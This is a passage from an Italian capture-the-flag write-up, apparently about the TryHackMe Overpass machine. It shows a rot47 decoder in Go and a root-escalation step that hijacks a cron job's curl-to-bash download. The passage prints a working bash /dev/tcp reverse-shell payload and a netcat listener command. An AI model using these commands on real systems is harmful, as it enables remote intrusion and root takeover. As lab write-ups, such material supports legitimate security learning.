func rot47(input string) string {
    var result []string
    for i := range input[:len(input)] {
        j := int(input[i])
        if (j >= 33) && (j <= 126) {
            result = append(result, string(rune(33+((j+14)%94))))
        } else {
            result = append(result, string(input[i]))
        }
    }
    return strings.Join(result, "")
}

    Ogni minuto viene eseguito curl overpass.thm/downloads/src/buildscript.sh | bash come root! Possiamo modificare a cosa punta overpass.thm, se proviamo a fare curl overpass.thm/downloads/src/buildscript.sh | bash vediamo che overpass.thm punta a localhost (127.0.0.1) Possiamo aprire sulla macchina attaccante un webserver in python che ospita un file buildscript.sh malevolo che crea una reverse-shell (Reverse-Shell e Bind Shell)! Dalla macchina attaccante avvio il webserver python3 -m http.server 80 e dalla stessa cartella di dove ho avviato il webserver creo questa struttura di file e cartelle downloads/src/buildscript.sh e in buildscript.sh scrivo il payload (Reverse-Shell e Bind Shell)

    1
    bash -c 'exec bash -i &>/dev/tcp/192.168.163.29/4444 <&1'

    Dove 192.168.163.29 è la macchina dove verrà instaurato la reverse shell, IP ottenuto tramite ip a show tun0 Subito dopo apriamo subito la porta 4444 per ricevere la reverse shell usando netcat

    1
    nc -lvnp 4444
